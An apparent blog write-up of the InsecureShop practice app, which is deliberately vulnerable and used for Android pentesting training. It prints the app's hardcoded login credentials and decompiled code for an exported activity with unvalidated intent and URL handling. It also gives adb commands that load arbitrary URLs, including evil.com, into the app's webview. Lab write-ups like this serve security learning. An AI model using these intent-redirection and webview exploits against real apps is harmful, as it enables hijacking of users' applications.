---
title: InsecureShop app Walkthrough
date: 2024-04-30 00:00:00 +0530
categories: [Android, Pentesting]
tags: [android, re]
---

Hello all! 

This is going to be a short walkthrough or writeup of the `InsecureShop` app. 

In my previous blog I added a lot of theory and workings of each functionality so I thought to make this a little less detailed. With a little bit of objective and solutions. 

### Login

Objective : To find a way to login to the app. 

Solution : 

There was no option to register and we had to login to enter the app. I revewied the `LoginActivity` class and could see the username and password being checked. And finally in the `Util` class we can see that this was hardcoded. 

```java
    private final HashMap<String, String> getUserCreds() {
        HashMap userCreds = new HashMap();
        userCreds.put("shopuser", "!ns3csh0p");
        return userCreds;
    }
```

### WebView2 Acitivty

Objective : To find a way to load arbitrary URIs on the app's webview

Solution : 

The next thing I noticed was the `More Info` link on each item. When I clicked, I saw that it loads the insecureshop URL in it's webview. This was the activity which was being launched and it is exported too `WebView2Activity`. 

```java
Intent extraIntent = (Intent) getIntent().getParcelableExtra("extra_intent");
        if (extraIntent != null) {
            startActivity(extraIntent);
            finish();
            return;
        }
```

We can start this activity with an intent named "extra_intent" 

```java
String dataString = intent.getDataString();
        if (!(dataString == null || StringsKt.isBlank(dataString))) {
            Intent intent2 = getIntent();
            Intrinsics.checkExpressionValueIsNotNull(intent2, "intent");
            webview.loadUrl(intent2.getDataString());
            return;
        }
```

The data URL which is being loaded into the webview is not validated or checked properly. 

Combining all this, I was able to load http://evil.com in the apps webview. 

`adb shell am start -a android.intent.action.MAIN -n com.insecureshop/.WebView2Activity -e extra_intent -data "http://evil.com"`


### WebView Activity

When path is /web

`adb shell am start -a android.intent.action.MAIN -n com.insecureshop/.WebViewActivity -d "http://example.com/web?url=http://example.com"`

when path is /webview

`adb shell am start -a android.intent.action.MAIN -n com.insecureshop/.WebViewActivity -d "http://example.com/webview?url=insecureshopapp.com"`




